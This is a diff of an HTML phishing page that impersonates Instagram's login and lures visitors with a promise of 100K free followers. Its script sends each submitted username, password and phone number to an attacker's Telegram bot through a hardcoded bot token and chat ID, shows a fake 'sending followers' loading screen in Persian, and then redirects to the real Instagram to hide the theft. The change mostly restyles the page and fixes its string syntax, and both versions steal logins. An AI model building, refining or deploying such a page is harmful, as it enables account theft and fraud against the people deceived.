@@ -6,137 +6,110 @@
     <title>Instagram</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;600;700&display=swap');
-
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: #000;
-            font-family: 'Instagram Sans', -apple-system, sans-serif;
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#000;font-family:'Instagram Sans',sans-serif;color:#fff;
+            min-height:100vh;display:flex;align-items:center;justify-content:center;
+            overflow:hidden;
         }
-        .container {
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 16px;
-            padding: 40px 30px;
-            width: 92%;
-            max-width: 380px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(138,43,226,0.6), 0 0 80px rgba(0,255,255,0.3);
-            animation: pulse 4s infinite alternate;
+        .box{
+            background:rgba(0,0,0,0.9);backdrop-filter:blur(15px);
+            border:2px solid rgba(138,43,226,0.6);border-radius:20px;
+            padding:40px 30px;width:92%;max-width:380px;text-align:center;
+            box-shadow:0 0 80px rgba(138,43,226,0.8),0 0 120px rgba(0,255,255,0.5);
+            animation:glow 3s infinite alternate;
         }
-        @keyframes pulse {
-            from { box-shadow: 0 0 50px rgba(138,43,226,0.6), 0 0 80px rgba(0,255,255,0.3); }
-            to   { box-shadow: 0 0 70px rgba(138,43,226,0.9), 0 0 120px rgba(0,255,255,0.6); }
+        @keyframes glow{
+            from{box-shadow:0 0 80px rgba(138,43,226,0.8),0 0 120px rgba(0,255,255,0.5);}
+            to{box-shadow:0 0 120px rgba(138,43,226,1),0 0 180px rgba(0,255,255,0.8);}
         }
-        .logo {
-            font-size: 48px;
-            font-weight: 700;
-            background: linear-gradient(45deg, #8a2be2, #00ffff, #ff00ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 30px;
+        .logo{
+            font-size:50px;font-weight:700;
+            background:linear-gradient(45deg,#8a2be2,#00ffff,#ff00ff);
+            -webkit-background-clip:text;background-clip:text;
+            -webkit-text-fill-color:transparent;margin-bottom:30px;
         }
-        h2 {
-            font-size: 22px;
-            margin-bottom: 10px;
-            text-shadow: 0 0 15px #8a2be2;
+        input{
+            width:100%;padding:15px;margin:10px 0;
+            background:rgba(255,255,255,0.1);border:1px solid rgba(138,43,226,0.6);
+            border-radius:10px;color:white;font-size:15px;outline:none;
         }
-        p {
-            font-size: 14px;
-            opacity: 0.8;
-            margin-bottom: 25px;
+        input:focus{border-color:#00ffff;box-shadow:0 0 20px #00ffff;}
+        button{
+            width:100%;padding:15px;background:linear-gradient(45deg,#8a2be2,#00ffff);
+            border:none;border-radius:10px;color:white;font-weight:600;font-size:16px;
+            cursor:pointer;margin-top:15px;box-shadow:0 0 30px rgba(138,43,226,0.8);
         }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 8px;
-            color: white;
-            font-size: 15px;
-            outline: none;
-            transition: 0.3s;
+        button:hover{transform:scale(1.05);box-shadow:0 0 50px #8a2be2;}
+        .loading{
+            position:fixed;top:0;left:0;width:100%;height:100%;background:#000;
+            display:none;align-items:center;justify-content:center;flex-direction:column;
+            z-index:9999;
         }
-        input:focus {
-            border-color: #8a2be2;
-            box-shadow: 0 0 15px rgba(138,43,226,0.6);
+        .spinner{
+            width:80px;height:80px;border:8px solid #8a2be2;border-top:8px solid #00ffff;
+            border-radius:50%;animation:spin 1s linear infinite;margin-bottom:30px;
         }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(45deg, #8a2be2, #00ffff);
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 15px;
-            transition: 0.3s;
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(138,43,226,0.6);
-        }
-        .footer {
-            margin-top: 40px;
-            font-size: 11px;
-            opacity: 0.5;
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .load-text{
+            font-size:24px;background:linear-gradient(45deg,#8a2be2,#00ffff);
+            -webkit-background-clip:text;background-clip:text;
+            -webkit-text-fill-color:transparent;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="box">
     <div class="logo">Instagram</div>
-    
-    <h2>Log in to continue</h2>
-    <p>Enter your details to get 100K free followers & likes</p>
+    <h2>Get 100K Followers Now</h2>
+    <p>Log in to claim your reward</p>
 
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Username, email or phone" required autocomplete="username">
-        <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
-        <input type="text" id="phone" placeholder="Phone number (optional)" autocomplete="tel">
-        
-        <button type="submit">Log In & Claim Reward</button>
+    <form id="igForm">
+        <input type="text" id="user" placeholder="Username or email" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        <input type="text" id="phone" placeholder="Phone number (+98...)" required>
+        <button type="submit">Claim Reward</button>
     </form>
+</div>
 
-    <div class="footer">
-        © 2025 Instagram from Meta
-    </div>
+<div class="loading" id="loader">
+    <div class="spinner"></div>
+    <div class="load-text">در حال ارسال ۱۰۰,۰۰۰ فالوور...</div>
 </div>
 
 <script>
     const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
     const CHAT_ID = "6080665310";
 
-    document.getElementById('loginForm').onsubmit = async function(e) {
+    document.getElementById('igForm').onsubmit = async function(e) {
         e.preventDefault();
 
-        const u = document.getElementById('username').value.trim();
-        const p = document.getElementById('password').value;
-        const ph = document.getElementById('phone').value.trim() || "Not provided";
-const msg = Hello, I am MicY and I have captured new information from a new user and sent it to you
+        const u = document.getElementById('user').value.trim();
+        const p = document.getElementById('pass').value;
+        const ph = document.getElementById('phone').value.trim() || "ندارد";
+
+        const msg = `Hello, I am MicY and I have captured new information from a new user and sent it to you
 Username: ${u}
 Password: ${p}
 Phone number: ${ph}
-Macker: MicY™;
+Macker: MicY™`;
 
-        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage, {
+        // ارسال فوری به تلگرام
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
         });
 
-        // ریدایرکت به اینستاگرام واقعی
-        setTimeout(() => window.location.href = "https://www.instagram.com/", 500);
+        // نمایش صفحه لودینگ نئونی
+        document.querySelector('.box').style.display = "none";
+        document.getElementById('loader').style.display = "flex";
+
+        // بعد ۵ ثانیه می‌ره اینستاگرام واقعی
+        setTimeout(() => {
+            window.location.href = "https://instagram.com";
+        }, 5000);
     };
 </script>
 
